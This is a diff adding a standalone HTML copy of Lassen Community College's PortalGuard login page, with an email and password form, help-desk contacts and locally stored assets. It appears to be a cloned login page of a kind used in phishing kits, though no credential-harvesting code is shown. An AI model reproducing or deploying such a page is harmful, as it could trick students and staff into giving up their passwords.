@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>PortalGuard - Portal Access</title>
+
+	<link href="./bootstrap.min.css" type="text/css" rel="stylesheet">
+  	<link href="./style.css" type="text/css" rel="stylesheet">
+	<link href="./style_custom.css" type="text/css" rel="stylesheet">	
+</head>
+
+<body class="lccFlex" tabindex="-1">
+	<div class="logo-container bodyFlex pgHidden">
+		<div class="branded-logo">
+			<img id="LogoImg" class="center-block img-responsive" alt="Home Page Logo" src="./bkyi pure white.png">
+			<h1 id="lblMainFormTitle" style="margin: 0px;"><img id="BrandedLogo" class="center-block img-responsive" alt="Home Page Logo" src="./LCC.png"></h1>
+		</div>
+	</div>
+	<div id="login" class="loginFlex">
+		<div id="outerwrap">
+			<div class="row mainFlex">
+				<div class="logonbox">
+					<div id="loginTitle" class="tac">
+						<h2>Portal Login</h2>
+						<img id="LCCLogo" class="center-block img-responsive" alt="LCC Logo" src="./LCC.png">
+					</div>
+					<div id="ErrMsgLogin" role="status"></div>
+					<form method="post"  id="loginForm" autocomplete="off" class="form-horizontal">
+						
+						<div id="infoLogin" class="popupInstructions" role="status"></div>
+
+						<span id="Msg"></span>
+
+						<div id="divLoginNamePW">
+							<div class="row">
+								<div class="col-sm-12">
+									<table id="frmLogin" style="border-collapse:collapse;">
+	<tbody><tr>
+		<td>
+											<div class="form-group">
+												<div class="col-md-12">
+													<label id="lblUNameMain" for="frmLogin_UserName">LCC Email Address</label>
+													<br><a href="https://portalguard.lassencollege.edu/_layouts/PG/forgotuser.aspx">What's My LCC Email?</a>
+													<input name="frmLogin$UserName" type="text" maxlength="256" id="frmLogin_UserName" class="form-control" placeholder="Enter your username">
+													<span id="spnRememberUsername" style="display:none">
+														<input type="checkbox" id="RememberUsername">
+														<label id="lblRememberUsername" for="RememberUsername" class="lblCheck">Remember username</label>
+													</span>
+												</div>
+											</div>
+											<div id="fldStaticPWLogin" style="" class="form-group">
+												<div class="col-md-12">
+													<div id="divMainPWLabel"><label id="lblPWMain" for="frmLogin_Password">Password</label></div>
+													<input name="frmLogin$Password" type="password" maxlength="256" id="frmLogin_Password" class="form-control" placeholder="Enter your password" onkeypress="handleKeyPress(this, event)">
+													<span id="spanShowPWs1" style="display:none">
+														<input name="showpws" id="showpwsMain" type="checkbox" value="1">
+														<label id="lblShowPWs1" for="showpwsMain" class="lblCheck">Show password</label>
+													</span>
+												</div>
+											</div>
+											<div id="divRememberMe" style="display:none">
+												<input id="frmLogin_RememberMe" type="checkbox" name="frmLogin$RememberMe">
+												<label id="lblRememberMe" for="frmLogin_RememberMe" class="lblCheck">Remember me on this browser</label>
+											</div>
+											<span style="display:none"><input type="submit" name="frmLogin$Login" value="Login" id="frmLogin_Login"></span>
+										</td>
+	</tr>
+</tbody></table>
+								</div>
+							</div>
+
+							<div class="col-md-12">
+								<div class="row">
+									<div id="btnFirstContinue" class="row containerPGButton" style="display: none">
+										<div class="col-md-6 col-md-offset-3">
+											<button class="PGButton btn" id="btnLoginContinue">Continue</button>
+										</div>
+									</div>
+									<div id="btnStaticPWLogin" class="row containerPGButton" style="">
+										<div class="col-md-12 col-sm-12">
+											<button class="PGButton btn" id="btnLogin">Login</button>
+										</div>
+										<div class="col-md-4 col-sm-12 pgHidden">
+											<button class="PGButton btn" id="btnSetPW"style="display: none">Set Password</button>
+										</div>
+										<div class="col-md-12 col-sm-12">
+											<button class="PGButton btn" id="btnSelfServe" style="">Forgot Password?</button>
+										</div>
+									</div>
+								</div>
+								<div class="col-md-12 mainFlex pgHidden">
+									<div class="linkForgotPW">
+									</div>
+									<div class="linkForgotUsername">
+										<a href="#" target="_blank">Forgot Username?</a>
+									</div>
+								</div>
+							</div>
+						</div>
+				</form>
+				</div>
+			</div>
+		</div>
+		<!-- Additional Information Section -->
+			<div class="logonbox" style="margin-top: 25px;">
+				<div class="row" style="">
+						<div class="col-md-12 dlghdr" style="text-align:center;">
+							<h2 style="font-size:1.5em; font-weight: 500;">Need Assistance?</h2>
+						</div>
+						<div class="row">
+							<div class="col-md-12 ">
+							<div style="padding-left:5%;padding-right:5%;">
+								<p>If you have any questions or problems, please contact the Help Desk:</p>
+								<ul>
+									<li>Phone: (530)251-8844</li>
+									<li>Email: <a href="mailto:help@lassencollege.edu">help@lassencollege.edu</a></li>
+								</ul>
+							</div>
+							</div>
+						</div>
+				</div>
+			</div>
+				<!-- End of Additional Information Section -->
+	</div>
+	<script src="./function.js"></script>
+</body></html>
